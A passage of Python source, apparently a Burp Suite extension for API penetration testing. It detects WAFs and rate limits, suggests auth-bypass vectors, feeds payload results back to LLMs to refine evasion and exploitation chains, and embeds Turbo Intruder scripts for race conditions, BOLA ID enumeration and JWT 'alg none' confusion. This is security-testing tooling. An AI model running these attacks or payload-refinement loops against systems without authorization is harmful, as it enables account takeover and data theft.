            [self._ascii_safe(x, lower=True) for x in (other_entry.get("auth_detected", []) or [])]
        )
        return {
            "status_proximity": abs(target_status - other_status),
            "auth_overlap": bool(target_auth.intersection(other_auth)),
            "content_type_match": self._ascii_safe(
                target_entry.get("content_type", ""), lower=True
            )
            == self._ascii_safe(other_entry.get("content_type", ""), lower=True),
        }

    def _detect_waf(self, entry):
        headers = entry.get("response_headers", {}) or {}
        body = self._ascii_safe(entry.get("response_body", ""), lower=True)
        signals = []
        waf_header_markers = [
            "cf-ray",
            "x-sucuri-id",
            "x-akamai",
            "x-imperva-id",
            "x-cdn",
        ]
        for header_key, header_value in headers.items():
            key_lower = self._ascii_safe(header_key, lower=True)
            value_lower = self._ascii_safe(header_value, lower=True)
            if any(marker in key_lower for marker in waf_header_markers):
                signals.append("header:" + key_lower)
            if key_lower == "server" and any(
                vendor in value_lower
                for vendor in ["cloudflare", "akamai", "sucuri", "imperva", "incapsula"]
            ):
                signals.append("server:" + value_lower[:40])

        if any(
            marker in body
            for marker in [
                "request blocked",
                "access denied",
                "waf",
                "security rule",
                "forbidden by policy",
            ]
        ):
            signals.append("body:block_page")

        return {"detected": bool(signals), "signals": list(dict.fromkeys(signals))[:8]}

    def _detect_rate_limit(self, entries):
        entries_list = entries if isinstance(entries, list) else [entries]
        rate_headers = {}
        status_429_count = 0
        for sample in entries_list[:20]:
            if not isinstance(sample, dict):
                continue
            status_code = int(sample.get("response_status", 0) or 0)
            if status_code == 429:
                status_429_count += 1
            headers = sample.get("response_headers", {}) or {}
            for key, value in headers.items():
                key_lower = self._ascii_safe(key, lower=True)
                if key_lower in [
                    "x-ratelimit-limit",
                    "x-ratelimit-remaining",
                    "x-ratelimit-reset",
                    "retry-after",
                ]:
                    rate_headers[key_lower] = self._ascii_safe(value)[:80]
        rpm = None
        limit_val = self._ascii_safe(rate_headers.get("x-ratelimit-limit", ""))
        if re.match(r"^\d+$", limit_val):
            rpm = int(limit_val)
        return {
            "detected": bool(status_429_count > 0 or rate_headers),
            "status_429_count": status_429_count,
            "header_hints": rate_headers,
            "requests_per_minute": rpm,
        }

    def _suggest_auth_bypass(self, entry, attack):
        auth_types = [self._ascii_safe(x, lower=True) for x in (entry.get("auth_detected", []) or [])]
        attack_type = self._ascii_safe((attack or {}).get("type") or "", lower=True)
        vectors = []

        if "bearer token" in auth_types:
            vectors.extend(
                [
                    "remove authorization header",
                    "use expired or malformed bearer token",
                    "swap token subject with another user identifier",
                ]
            )
        if "session cookie" in auth_types:
            vectors.extend(
                [
                    "strip session cookie",
                    "replay stale session cookie",
                    "tamper session identifier format",
                ]
            )
        if "none" in auth_types or not auth_types:
            vectors.append("attempt forced browsing without auth")
        if attack_type in ["bola", "auth bypass", "idor"]:
            vectors.extend(
                [
                    "parameter object-id swapping",
                    "cross-account identifier replay",
                ]
            )

        dedup = []
        seen = set()
        for vector in vectors:
            key = self._ascii_safe(vector, lower=True)
            if key in seen:
                continue
            seen.add(key)
            dedup.append(vector)
        return dedup[:12]

    def _export_behavioral_analysis(self, data_snapshot):
        """Export endpoint behavior patterns for AI logic-flaw analysis."""
        return {
            "state_transitions": self._analyze_state_transitions(data_snapshot),
            "parameter_dependencies": self._analyze_param_dependencies(data_snapshot),
            "rate_limit_patterns": self._analyze_rate_limits(data_snapshot),
            "session_management": self._analyze_sessions(data_snapshot),
            "authorization_matrix": self._build_authz_matrix(data_snapshot),
        }

    def _analyze_state_transitions(self, data_snapshot):
        transitions = {}
        for endpoint_key, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            method = self._ascii_safe(entry.get("method")).upper()
            path = self._ascii_safe(
                entry.get("normalized_path") or entry.get("path") or "/",
                lower=True,
            )
            segments = self._split_path_segments(path)
            resource = segments[0] if segments else "root"
            if resource not in transitions:
                transitions[resource] = {
                    "methods": set(),
                    "endpoints": [],
                    "write_methods": 0,
                }
            transitions[resource]["methods"].add(method)
            transitions[resource]["endpoints"].append(endpoint_key)
            if method in ["POST", "PUT", "PATCH", "DELETE"]:
                transitions[resource]["write_methods"] += 1

        result = []
        for resource, info in transitions.items():
            result.append(
                {
                    "resource": resource,
                    "methods": sorted(list(info["methods"])),
                    "endpoint_count": len(info["endpoints"]),
                    "write_method_count": info["write_methods"],
                    "sample_endpoints": info["endpoints"][:8],
                }
            )
        return sorted(result, key=lambda x: x["endpoint_count"], reverse=True)[:120]

    def _analyze_param_dependencies(self, data_snapshot):
        dependencies = {}
        for endpoint_key, entries in data_snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            dependencies[endpoint_key] = {
                "required_params": self._identify_required_params(entries_list),
                "optional_params": self._identify_optional_params(entries_list),
                "hidden_params": self._identify_hidden_params(entries_list),
                "param_interactions": self._detect_param_interactions(entries_list),
            }
        return dependencies

    def _identify_required_params(self, entries):
        entries_list = [e for e in (entries or []) if isinstance(e, dict)]
        if not entries_list:
            return []
        param_sets = []
        for sample in entries_list:
            param_sets.append(set(self._extract_param_names(sample)))
        required = set(param_sets[0]) if param_sets else set()
        for param_set in param_sets[1:]:
            required = required.intersection(param_set)
        return sorted(list(required))[:80]

    def _identify_optional_params(self, entries):
        entries_list = [e for e in (entries or []) if isinstance(e, dict)]
        if not entries_list:
            return []
        param_sets = []
        for sample in entries_list:
            param_sets.append(set(self._extract_param_names(sample)))
        union_set = set()
        for param_set in param_sets:
            union_set.update(param_set)
        required = set(self._identify_required_params(entries_list))
        optional = union_set.difference(required)
        return sorted(list(optional))[:80]

    def _identify_hidden_params(self, entries):
        hidden_keywords = ["admin", "debug", "internal", "test", "dev", "secret", "role", "is_admin"]
        names = set()
        entries_list = [e for e in (entries or []) if isinstance(e, dict)]
        for sample in entries_list:
            for name in self._extract_param_names(sample):
                lower = self._ascii_safe(name, lower=True)
                if any(keyword in lower for keyword in hidden_keywords):
                    names.add(name)
        return sorted(list(names))[:40]

    def _detect_param_interactions(self, entries):
        pair_counts = {}
        entries_list = [e for e in (entries or []) if isinstance(e, dict)]
        for sample in entries_list:
            names = sorted(list(set(self._extract_param_names(sample))))
            for i in range(len(names)):
                for j in range(i + 1, len(names)):
                    pair = "{}|{}".format(names[i], names[j])
                    pair_counts[pair] = pair_counts.get(pair, 0) + 1
        ranked = sorted(pair_counts.items(), key=lambda item: item[1], reverse=True)
        interactions = []
        for pair, count in ranked[:20]:
            left, right = pair.split("|", 1)
            interactions.append({"params": [left, right], "cooccurrence_count": count})
        return interactions

    def _analyze_rate_limits(self, data_snapshot):
        patterns = []
        for endpoint_key, entries in data_snapshot.items():
            rate_info = self._detect_rate_limit(entries)
            if rate_info.get("detected"):
                patterns.append({"endpoint": endpoint_key, "rate_limit": rate_info})
        return patterns[:120]

    def _analyze_sessions(self, data_snapshot):
        auth_counts = {}
        cookie_names = set()
        for _, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            for auth_type in entry.get("auth_detected", []) or []:
                auth_key = self._ascii_safe(auth_type)
                auth_counts[auth_key] = auth_counts.get(auth_key, 0) + 1
            headers = entry.get("headers", {}) or {}
            cookie_header = self._ascii_safe(headers.get("Cookie") or headers.get("cookie") or "")
            if cookie_header:
                for part in cookie_header.split(";"):
                    name = self._ascii_safe(part.split("=", 1)[0]).strip()
                    if name:
                        cookie_names.add(name)
        return {
            "auth_method_counts": auth_counts,
            "cookie_names": sorted(list(cookie_names))[:80],
        }

    def _build_authz_matrix(self, data_snapshot):
        matrix = []
        for endpoint_key, entries in data_snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            auth_contexts = set()
            statuses = set()
            for sample in entries_list:
                if not isinstance(sample, dict):
                    continue
                for auth_type in sample.get("auth_detected", []) or []:
                    auth_contexts.add(self._ascii_safe(auth_type))
                status_code = sample.get("response_status", 0)
                if isinstance(status_code, int):
                    statuses.add(status_code)
            matrix.append(
                {
                    "endpoint": endpoint_key,
                    "auth_contexts": sorted(list(auth_contexts)),
                    "observed_status_codes": sorted(list(statuses)),
                    "sample_count": len(entries_list),
                }
            )
        return matrix[:200]

    def _create_ai_feedback_loop_export(self, test_results):
        """Export test results so AI can refine payload generation strategy."""
        results = test_results if isinstance(test_results, list) else []
        feedback = {
            "tested_payloads": [],
            "successful_attacks": [],
            "failed_attempts": [],
            "learned_patterns": {},
        }
        for result in results:
            if not isinstance(result, dict):
                continue
            vulnerable = bool(result.get("vulnerable"))
            feedback_entry = {
                "payload": result.get("payload"),
                "success": vulnerable,
                "response_analysis": {
                    "status": result.get("status"),
                    "body_snippet": self._ascii_safe(result.get("body", ""))[:200],
                    "headers": result.get("headers", {}),
                    "timing": result.get("response_time"),
                },
                "refinement_hints": self._generate_refinement_hints(result),
            }
            feedback["tested_payloads"].append(feedback_entry)
            if vulnerable:
                feedback["successful_attacks"].append(feedback_entry)
            else:
                feedback["failed_attempts"].append(feedback_entry)

        feedback["learned_patterns"] = self._extract_learned_patterns(results)
        if not results:
            feedback["instructions"] = [
                "Populate tested_payloads with real execution results.",
                "Mark vulnerable=true when exploit indicators are confirmed.",
                "Re-export this file and submit to AI for refinement.",
            ]
        return feedback

    def _generate_refinement_hints(self, result):
        hints = []
        status = int(result.get("status", 0) or 0)
        body = self._ascii_safe(result.get("body", ""), lower=True)
        if status in [401, 403]:
            hints.append("focus on auth context or privilege mismatch")
        elif status in [429]:
            hints.append("throttle requests or rotate request cadence")
        elif status >= 500:
            hints.append("server-side error observed, check for injection pivot")
        if "blocked" in body or "waf" in body or "access denied" in body:
            hints.append("try encoding/header/path bypass variants")
        if not hints:
            hints.append("adjust payload syntax and parameter placement")
        return hints[:6]

    def _extract_learned_patterns(self, test_results):
        results = test_results if isinstance(test_results, list) else []
        summary = {"total": len(results), "successful": 0, "by_category": {}}
        for result in results:
            if not isinstance(result, dict):
                continue
            category = self._ascii_safe(result.get("category") or result.get("type") or "unknown")
            if category not in summary["by_category"]:
                summary["by_category"][category] = {"total": 0, "successful": 0}
            summary["by_category"][category]["total"] += 1
            if bool(result.get("vulnerable")):
                summary["successful"] += 1
                summary["by_category"][category]["successful"] += 1
        return summary

    def _export_for_llm_platform(self, platform, ai_input):
        """Export in format optimized for specific LLM platforms."""
        if platform == "openai":
            return self._export_openai_format(ai_input)
        if platform == "anthropic":
            return self._export_anthropic_format(ai_input)
        return self._export_ollama_format(ai_input)

    def _export_openai_format(self, ai_input):
        """Format optimized for OpenAI chat/completions style consumption."""
        return {
            "model": "gpt-5.4",
            "messages": [
                {"role": "system", "content": self._generate_enhanced_ai_prompt()},
                {"role": "user", "content": json.dumps(ai_input)},
            ],
            "tools": [
                {
                    "type": "function",
                    "function": {
                        "name": "generate_security_payloads",
                        "description": "Generate context-aware security testing payloads",
                        "parameters": {
                            "type": "object",
                            "properties": {
                                "payloads": {"type": "array"},
                                "exploitation_chain": {"type": "array"},
                                "confidence_scores": {"type": "object"},
                            },
                        },
                    },
                }
            ],
            "temperature": 0.2,
        }

    def _export_anthropic_format(self, ai_input):
        return {
            "model": "claude-3-5-sonnet-latest",
            "system": self._generate_enhanced_ai_prompt(),
            "messages": [{"role": "user", "content": json.dumps(ai_input)}],
            "max_tokens": 4096,
            "temperature": 0.2,
        }

    def _export_ollama_format(self, ai_input):
        return {
            "model": "llama3.1:8b-instruct",
            "prompt": "{}\n\nINPUT:\n{}".format(
                self._generate_enhanced_ai_prompt(), json.dumps(ai_input, indent=2)
            ),
            "options": {"temperature": 0.2},
        }

    def _get_vuln_summary(self, attacks_snapshot):
        summary = {"total": len(attacks_snapshot), "by_type": {}, "by_severity": {}}
        for _, attack in attacks_snapshot:
            attack_obj = attack if isinstance(attack, dict) else {}
            attack_type = self._ascii_safe(attack_obj.get("type") or "Unknown")
            severity = self._calculate_attack_severity(attack_obj)
            summary["by_type"][attack_type] = summary["by_type"].get(attack_type, 0) + 1
            summary["by_severity"][severity] = summary["by_severity"].get(severity, 0) + 1
        return summary

    def _extract_api_patterns(self, data_snapshot):
        counts = {}
        for _, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            for pattern in entry.get("api_patterns", []) or []:
                key = self._ascii_safe(pattern)
                counts[key] = counts.get(key, 0) + 1
        ranked = sorted(counts.items(), key=lambda item: item[1], reverse=True)
        return [{"pattern": key, "count": value} for key, value in ranked[:40]]

    def _extract_auth_flows(self, data_snapshot):
        counts = {}
        protected = []
        public = []
        for endpoint_key, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            auth_types = entry.get("auth_detected", []) or []
            auth_lower = [self._ascii_safe(x, lower=True) for x in auth_types]
            is_public = ("none" in auth_lower) or (len(auth_lower) == 0)
            if is_public:
                public.append(endpoint_key)
            else:
                protected.append(endpoint_key)
            for auth_type in auth_types:
                key = self._ascii_safe(auth_type)
                counts[key] = counts.get(key, 0) + 1
        return {
            "auth_method_counts": counts,
            "protected_examples": protected[:30],
            "public_examples": public[:30],
        }

    def _extract_business_logic(self, data_snapshot):
        hints = []
        keywords = [
            "price",
            "amount",
            "cost",
            "total",
            "quantity",
            "stock",
            "discount",
            "coupon",
            "balance",
            "wallet",
            "refund",
            "checkout",
            "payment",
            "transfer",
            "withdraw",
            "role",
            "permission",
            "admin",
            "limit",
            "quota",
        ]
        for endpoint_key, entries in data_snapshot.items():
            entry = self._get_entry(entries)
            path = self._ascii_safe(
                entry.get("normalized_path") or entry.get("path") or "/", lower=True
            )
            param_names = [self._ascii_safe(x, lower=True) for x in self._extract_param_names(entry)]
            joined = " ".join([path] + param_names)
            matched = [word for word in keywords if word in joined]
            if matched:
                hints.append(
                    {
                        "endpoint": endpoint_key,
                        "keywords": matched[:8],
                        "method": self._ascii_safe(entry.get("method", "")).upper(),
                    }
                )
        return hints[:120]

    def _calculate_attack_severity(self, attack):
        attack_type = self._ascii_safe((attack or {}).get("type") or "", lower=True)
        if attack_type in [
            "bola",
            "idor",
            "auth bypass",
            "sql injection",
            "ssrf",
            "xxe",
            "deserialization",
        ]:
            return "Critical"
        if attack_type in [
            "xss",
            "nosql injection",
            "ssti",
            "mass assignment",
            "waf bypass",
            "jwt",
        ]:
            return "High"
        return "Medium"

    def _generate_enhanced_ai_prompt(self):
        return """# Advanced API Security Payload Generation

## Context
You are analyzing real API capture data with vulnerability findings, response patterns, and behavior analytics.

## Tasks
1. Generate baseline, context-aware, evasion, and chained payloads per vulnerability.
2. Define success indicators (status/body/header/timing) and false-positive guards.
3. Propose exploitation chains and verification steps (automated + manual).
4. Prioritize by severity, confidence, authentication context, and business impact.

## Output Requirements
- Return JSON only.
- Include endpoint, payload category, payload value, method, headers/body placement, confidence, and remediation.
- Provide at least one exploitation chain when related endpoints suggest escalation paths.
"""

    def _generate_ai_prompt(self):
        """Backward-compatible alias for older AI export consumers."""
        return self._generate_enhanced_ai_prompt()

    def _export_turbo_intruder(self):
        """Export Turbo Intruder Python scripts for race conditions and high-speed attacks"""
        import os

        if not self.api_data or not self.fuzzing_attacks:
            msg = "[!] Generate fuzzing attacks first"
            self.fuzzer_area.append("\n" + msg + "\n")
            self.log_to_ui(msg)
            return

        self.fuzzer_area.append("\n" + "=" * 80 + "\n")
        self.fuzzer_area.append("[*] Exporting Turbo Intruder scripts...\n")

        export_dir = self._get_export_dir("TurboIntruder")
        if not export_dir:
            return

        # Generate scripts for different attack types
        scripts = {
            "race_condition.py": self._generate_race_script(),
            "bola_enum.py": self._generate_bola_script(),
            "jwt_brute.py": self._generate_jwt_script(),
        }

        for script_name, script_content in scripts.items():
            filename = os.path.join(export_dir, script_name)
            try:
                writer = FileWriter(filename)
                writer.write(script_content)
                writer.close()
                self.fuzzer_area.append("[+] Created: {}\n".format(script_name))
            except Exception as e:
                self.fuzzer_area.append(
                    "[!] Failed: {} - {}\n".format(script_name, str(e))
                )
                self.log_to_ui("[!] Failed to write {}: {}".format(script_name, str(e)))

        self.fuzzer_area.append("[+] Exported Turbo Intruder scripts\n")
        self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
        self.log_to_ui("[+] Exported Turbo Intruder scripts to: {}".format(export_dir))

    def _generate_race_script(self):
        return """# Turbo Intruder - Race Condition Attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)

    # Warm up connection pool
    for i in range(10):
        engine.queue(target.req)

    # Send parallel requests
    for i in range(100):
        engine.queue(target.req, gate='race1')

    # Open gate for simultaneous execution
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
"""

    def _generate_bola_script(self):
        return """# Turbo Intruder - BOLA Enumeration
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=100,
                          pipeline=False)

    # Enumerate IDs
    for i in range(1, 10000):
        engine.queue(target.req, str(i))

    # Try common usernames
    for word in open('/usr/share/wordlists/usernames.txt'):
        engine.queue(target.req, word.strip())

def handleResponse(req, interesting):
    if req.status == 200 and len(req.response) > 100:
        table.add(req)
"""

    def _generate_jwt_script(self):
        return """# Turbo Intruder - JWT Algorithm Confusion
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=50,
                          pipeline=False)

    # Algorithm confusion attacks
    algs = ['none', 'None', 'NONE', 'nOnE', 'HS256', 'HS384', 'HS512']
    for alg in algs:
        modified_req = target.req.replace('alg":"RS256', 'alg":"' + alg)
        engine.queue(modified_req)

    # Null signature
    engine.queue(target.req.replace(target.req.split('.')[-1], ''))

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
"""

    def _export_nuclei_targets(self):
        """Export Nuclei scan results - only if scan has been run"""
        current_text = self.nuclei_area.getText()
        if not current_text or "NUCLEI SCAN RESULTS" not in current_text:
            self.nuclei_area.setText("[!] No discoveries to export\n[!] Run Nuclei scan first\n")
            return
        self.nuclei_area.append("\n[!] Results displayed above\n")

    def _collect_nuclei_targets(self):
        """Collect scoped Nuclei targets without cross-host path cartesian expansion."""
        static_skip_parts = set(
            [
                "js",
                "css",
                "static",
                "dist",
                "assets",
                "images",
                "img",
                "fonts",
                "cdn-cgi",
                "captcha",
                "recaptcha",
                "player",
            ]
        )

        with self.lock:
            entries_snapshot = [self._get_entry(entries) for entries in self.api_data.values()]

        scope_override = self._get_target_scope_override()
        host_counts = {}
        base_scores = {}
        for entry in entries_snapshot:
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            host_counts[host] = host_counts.get(host, 0) + 1
            if (not scope_override.get("enabled")) and self._is_wayback_noise_host(host):
                continue

            base = self._infer_base_domain(host)
            if not base:
                continue

            score = 1
            method = self._ascii_safe(entry.get("method"), lower=True).strip()
            if method in ["post", "put", "patch", "delete"]:
                score += 2

            path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True)
            parts = [p for p in path.strip("/").split("/") if p]
            if parts:
                first_part = parts[0]
                if first_part.startswith("api") or first_part in [
                    "v1",
                    "v2",
                    "v3",
                    "v4",
                    "graphql",
                    "rest",
                    "svc",
                    "internal",
                    "auth",
                    "oauth",
                ]:
                    score += 3
            base_scores[base] = base_scores.get(base, 0) + score

        if scope_override.get("enabled"):
            selected_host = "target-bases"
            force_host = False
            allowed_bases = set(scope_override.get("bases", set()))
        else:
            selected_host = "all"
            try:
                if hasattr(self, "host_filter") and self.host_filter is not None:
                    selected_host = self._ascii_safe(
                        str(self.host_filter.getSelectedItem()), lower=True
                    ).strip()
            except Exception as e:
                self._callbacks.printError("Nuclei host-filter read error: {}".format(str(e)))
                selected_host = "all"
            force_host = bool(selected_host and selected_host != "all")

            sorted_bases = sorted(base_scores.items(), key=lambda item: (-item[1], item[0]))
            allowed_bases = set([base for base, _ in sorted_bases[:1]])
            if not allowed_bases:
                fallback_bases = {}
                for host, count in host_counts.items():
                    if self._is_wayback_noise_host(host):
                        continue
                    base = self._infer_base_domain(host)
                    if not base:
                        continue
                    fallback_bases[base] = fallback_bases.get(base, 0) + count
                fallback_sorted = sorted(
                    fallback_bases.items(), key=lambda item: (-item[1], item[0])
                )
                allowed_bases = set([base for base, _ in fallback_sorted[:1]])

        dropped_noise_host = 0
        dropped_scope_host = 0
        dropped_path = 0
        inspected_entries = 0
        candidates = set()
        for entry in entries_snapshot:
            inspected_entries += 1
            protocol = self._ascii_safe(entry.get("protocol"), lower=True).strip() or "https"
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                dropped_scope_host += 1
                continue

            if scope_override.get("enabled"):
                if not self._host_matches_target_scope(host, scope_override):
                    dropped_scope_host += 1
                    continue
            elif force_host:
                if host != selected_host:
                    dropped_scope_host += 1
                    continue
            else:
                if self._is_wayback_noise_host(host):
                    dropped_noise_host += 1
                    continue
                host_base = self._infer_base_domain(host)
                if allowed_bases and host_base not in allowed_bases:
                    dropped_scope_host += 1
                    continue

            port = entry.get("port", -1)
            if port == -1:
                port = 443 if protocol == "https" else 80
            if (protocol == "https" and port == 443) or (
                protocol == "http" and port == 80
            ):
                base = "{}://{}".format(protocol, host)
            else:
                base = "{}://{}:{}".format(protocol, host, port)

            candidates.add(base)

            raw_path = self._ascii_safe(entry.get("normalized_path") or "/")
            parts = [self._ascii_safe(part, lower=True).strip() for part in raw_path.strip("/").split("/") if part]
            if not parts:
                continue

            first_part = parts[0]
            if first_part in static_skip_parts or self._ffuf_is_noise_path_segment(first_part):
                dropped_path += 1
                continue

            candidates.add(base + "/" + first_part)

            if first_part == "api" and len(parts) > 1:
                second_part = parts[1]
                if (
                    second_part
                    and second_part not in static_skip_parts
                    and not self._ffuf_is_noise_path_segment(second_part)
                ):
                    candidates.add(base + "/api/" + second_part)

            if first_part.startswith("v") and len(parts) > 1:
                second_part = parts[1]
                if (
                    second_part
                    and second_part not in static_skip_parts
                    and not self._ffuf_is_noise_path_segment(second_part)
                ):
                    candidates.add(base + "/" + first_part + "/" + second_part)

        ordered = sorted(candidates)
        raw_candidates = len(ordered)
        truncated = 0
        if raw_candidates > self.NUCLEI_MAX_TARGETS:
            truncated = raw_candidates - self.NUCLEI_MAX_TARGETS
            ordered = ordered[: self.NUCLEI_MAX_TARGETS]

        meta = {
            "inspected_entries": inspected_entries,
            "raw_candidates": raw_candidates,
            "dropped_noise_host": dropped_noise_host,
            "dropped_scope_host": dropped_scope_host,
            "dropped_path": dropped_path,
            "truncated": truncated,
            "force_host": force_host,
            "selected_host": selected_host,
            "allowed_bases": sorted(list(allowed_bases)),
            "manual_scope_enabled": bool(scope_override.get("enabled")),
            "manual_scope_line_count": len(scope_override.get("lines", [])),
            "manual_scope_host_count": len(scope_override.get("hosts", set())),
            "manual_scope_base_count": len(scope_override.get("bases", set())),
            "manual_scope_preview": list(scope_override.get("lines", []))[:3],
        }
        return ordered, meta

    def _infer_nuclei_output_severity(self, line_text):
        """Infer severity token from plain nuclei output line."""
        safe_line = self._ascii_safe(line_text, lower=True)
        match = re.search(r"\[(critical|high|medium|low|info)\]", safe_line)
        if match:
            return match.group(1)
        return "info"

    def _extract_nuclei_plain_findings(self, output_text, max_lines=300):
        """Extract finding-like lines from plain nuclei process output."""
        lines = []
        seen = set()
        text = self._ascii_safe(output_text)
        for raw in text.splitlines():
            clean = self.ANSI_ESCAPE_PATTERN.sub("", self._ascii_safe(raw)).strip()
            if not clean:
                continue
            lower = clean.lower()
            if lower.startswith("[*]") or lower.startswith("[inf]") or lower.startswith("[wrn]"):
                continue
            if "templates loaded" in lower or "targets loaded" in lower:
                continue
            if "http://" not in lower and "https://" not in lower:
                continue
            if clean in seen:
                continue
            seen.add(clean)
            lines.append(clean)
            if len(lines) >= max_lines:
                break
        return lines

    def _write_nuclei_partial_results_jsonl(self, output_text, output_path):
        """Create JSONL fallback results from plain nuclei output lines."""
        findings = self._extract_nuclei_plain_findings(output_text)
        writer = None
        try:
            writer = open(output_path, "w")
            for line in findings:
                severity = self._infer_nuclei_output_severity(line)
                row = {
                    "template-id": "partial-output",
                    "matched-at": line,
                    "info": {"severity": severity},
                }
                writer.write(json.dumps(row) + "\n")
        except Exception as e:
            self._callbacks.printError(
                "Nuclei partial JSONL synthesis failed: {}".format(str(e))
            )
            return 0
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Nuclei partial JSONL close failed: {}".format(str(e))
                    )
        return len(findings)

    def _resolve_graphql_tool_path(self, field_name, candidates):
        """Resolve GraphQL stage tool path from existing tab field or fallback list."""
        import os

        if field_name and hasattr(self, field_name):
            try:
                field_obj = getattr(self, field_name)
                value = self._ascii_safe(field_obj.getText()).strip()
                if value:
                    return value
            except Exception as e:
                self._callbacks.printError(
                    "GraphQL tool path read error ({}): {}".format(field_name, str(e))
                )
        for candidate in (candidates or []):
            path = self._ascii_safe(candidate).strip()
            if not path:
                continue
            if os.path.exists(path):
                return path
        if candidates:
            return self._ascii_safe(candidates[-1]).strip()
        return ""

    def _normalize_graphql_target_url(self, value):
        """Normalize user or history target text into an HTTP URL."""
        text = self._ascii_safe(value).strip()
        if not text:
            return ""
        if not text.startswith("http://") and not text.startswith("https://"):
            text = text.strip("/")
            if "/" not in text:
                text = "https://{}/graphql".format(text)
            else:
                text = "https://{}".format(text)
        return self._clean_url(text)

    def _graphql_target_candidate_score(self, entry):
        """Score likely GraphQL endpoint candidates from captured traffic."""
        path = self._ascii_safe(
            entry.get("path") or entry.get("normalized_path") or "/", lower=True
        )
        query = self._ascii_safe(entry.get("query_string") or "", lower=True)
        body = self._ascii_safe(entry.get("request_body") or "", lower=True)
        content_type = self._ascii_safe(entry.get("content_type") or "", lower=True)
        method = self._ascii_safe(entry.get("method") or "GET", lower=True).strip().upper()

        score = 0
        if "graphql" in path:
            score += 12
        if "graphiql" in path or "playground" in path:
            score += 8
        if "graphql" in query:
            score += 7
        if any(token in query for token in ["query=", "operationname=", "__schema", "__type"]):
            score += 6
        if any(
            token in body
            for token in [
                '"query"',
                '"operationname"',
                "mutation",
                "subscription",
                "__schema",
                "__type",
            ]
        ):
            score += 8
        if "application/graphql" in content_type:
            score += 6
        if method in ["GET", "POST"] and score > 0:
            score += 1
        return score

    def _collect_graphql_target_candidates(self, max_candidates=30):
        """Collect ranked GraphQL target candidates from input and proxy history."""
        try:
            max_items = int(max_candidates)
        except Exception as e:
            self._callbacks.printError(
                "GraphQL candidate max parsing failed: {}".format(
                    self._ascii_safe(e)
                )
            )
            max_items = 30
        if max_items <= 0:
            max_items = 30

        candidate_scores = {}

        raw_input = self._ascii_safe(self.graphql_targets_field.getText()).strip()
        if raw_input:
            for raw in self._parse_comma_newline_values(raw_input):
                url = self._normalize_graphql_target_url(raw)
                if not url:
                    continue
                candidate_scores[url] = max(candidate_scores.get(url, 0), 40)

        with self.lock:
            snapshot = list(self.api_data.values())
        for entries in snapshot:
            entry = self._get_entry(entries)
            score = self._graphql_target_candidate_score(entry)
            if score <= 0:
                continue
            url = self._clean_url(self._build_url(entry, True))
            if not url:
                continue
            previous = candidate_scores.get(url, 0)
            if score > previous:
                candidate_scores[url] = score

        ordered = sorted(
            candidate_scores.items(), key=lambda item: (-int(item[1]), item[0])
        )
        return [
            {"url": url, "score": int(score)}
            for url, score in ordered[:max_items]
        ]

    def _autopopulate_graphql_targets_from_history(
        self, overwrite=False, append_output=False
    ):
        """Populate GraphQL targets field with selected proxy-history candidates."""
        if not hasattr(self, "graphql_targets_field") or self.graphql_targets_field is None:
            return []

        current_values = self._parse_comma_newline_values(
            self.graphql_targets_field.getText()
        )
        if current_values and (not overwrite):
            self.graphql_selected_targets = list(current_values)
            return list(current_values)

        candidates = self._collect_graphql_target_candidates(max_candidates=60)
        self.graphql_target_candidates = list(candidates)
        candidate_urls = [item.get("url") for item in candidates if item.get("url")]
        if not candidate_urls:
            if append_output and hasattr(self, "graphql_area") and self.graphql_area is not None:
                self.graphql_area.append("[!] No GraphQL targets found in proxy history\n")
            return []

        selected = []
        existing = list(getattr(self, "graphql_selected_targets", []) or [])
        if existing and (not overwrite):
            selected = [u for u in existing if u in candidate_urls]
        if not selected:
            selected = list(candidate_urls)

        max_targets = self._parse_positive_int(
            self.graphql_max_targets_field.getText(), 12, 1, 50
        )
        selected = selected[:max_targets]
        self.graphql_selected_targets = list(selected)
        self.graphql_targets_field.setText("\n".join(selected))

        if append_output and hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.append(
                "[+] GraphQL targets selected from history: {}\n".format(
                    len(selected)
                )
            )
        return list(selected)

    def _show_graphql_targets_popup(self, event):
        """Show selectable GraphQL targets from proxy history."""
        candidates = self._collect_graphql_target_candidates(max_candidates=80)
        self.graphql_target_candidates = list(candidates)
        if not candidates:
            if hasattr(self, "graphql_area") and self.graphql_area is not None:
                self.graphql_area.setText(
                    "[!] No GraphQL targets found in proxy history.\n"
                    "[*] Enter targets manually in textbox.\n"
                )
            return

        options = []
        for idx, item in enumerate(candidates):
            url = self._ascii_safe(item.get("url") or "").strip()
            if not url:
                continue
            score = int(item.get("score") or 0)
            options.append(
                {
                    "value": url,
                    "label": "#{:02d} [score {}] {}".format(idx + 1, score, url),
                }
            )

        preselected = list(getattr(self, "graphql_selected_targets", []) or [])
        if not preselected:
            preselected = [item.get("value") for item in options]

        selected = self._show_multi_select_targets_popup(
            "GraphQL Targets",
            options,
            preselected_values=preselected,
            footer_text=(
                "Default selection is all likely GraphQL targets from proxy history. "
                "Deselect anything you do not want to include."
            ),
        )
        if selected is None:
            return

        max_targets = self._parse_positive_int(
            self.graphql_max_targets_field.getText(), 12, 1, 50
        )
        selected = list(selected[:max_targets])
        self.graphql_selected_targets = list(selected)
        self.graphql_targets_field.setText("\n".join(selected))

        if hasattr(self, "graphql_area") and self.graphql_area is not None:
            self.graphql_area.append(
